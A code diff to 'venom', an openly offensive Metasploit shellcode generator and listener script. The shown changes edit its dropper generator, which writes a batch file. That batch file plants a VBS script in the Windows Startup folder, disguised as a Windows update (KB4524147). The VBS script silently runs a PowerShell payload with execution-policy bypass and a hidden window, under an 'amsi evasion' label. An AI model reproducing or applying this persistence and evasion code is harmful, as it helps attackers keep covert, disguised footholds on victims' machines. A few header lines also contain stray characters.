@@ -2,7 +2,7 @@
 # --------------------------------------------------------------
 # venom - metasploit Shellcode generator/compiler/listenner
 # Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.16evas
-# Suspicious-Shell-Activity (SSA) RedTeam develop @2017 - 2019
+# Suspicious-Shell-Activity (SSA) RedTeam develop @2017 - F2019
 # codename: aconitum_nappelus [ GPL licensed ]
 # --------------------------------------------------------------Fe
 # [DEPENDENCIES]
@@ -12276,7 +12276,7 @@ else
    ## Persistence Module Function (VBScript|BATch)
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       ## Silent Persistence script execution (no terminal prompt) using VBS script.
-      echo "' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.bat
+      echo "echo ' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.bat
       echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
       echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
    else
@@ -12510,7 +12510,7 @@ else
    ## Persistence Module Function (VBScript|BATch)
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       ## Silent Persistence script execution (no terminal prompt) using VBS script.
-      echo "' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.$ext.bat
+      echo "echo ' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.$ext.bat
       echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
    else
